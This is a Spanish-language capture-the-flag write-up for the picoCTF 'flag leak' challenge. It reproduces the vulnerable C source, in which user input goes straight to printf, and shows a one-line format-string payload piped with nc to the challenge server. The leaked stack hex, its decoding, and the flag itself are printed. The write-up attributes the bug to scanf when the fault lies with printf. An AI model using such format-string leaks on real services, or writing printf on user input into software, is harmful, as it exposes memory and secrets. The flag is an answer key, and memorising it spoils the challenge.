## Objetivo
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using: `nc saturn.picoctf.net 62418`
## Solución

```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/flagleak]
└─$ ls    
vuln  vuln.c

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/flagleak]
└─$ nano vuln.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
- Observamos que el código tiene un `scanf`, el `scanf` no formatea la salida y al no formatearla asume que es una cadena por lo que le enviamos un montón de %x para ver la memoria en hexadecimal.
```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/flagleak]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 62418
Tell me a story and then I'll tell you one >> Here's a story - 
ffb9f7b0ffb9f7d08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825e8531d00e83b6ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad200022e15c000e856d990804c00080494100804c000ffb9f89880494182ffb9f944ffb9f9500ffb9f8b0

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/flagleak]
└─$ 
```
- El texto generado se lo enviamos a `CyberChef` y le aplicamos las etiquetas de `Swap endianness` y `From Hex`.
![[20241112121143.png]]
```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```

## Notas Adicionales
## Referencias
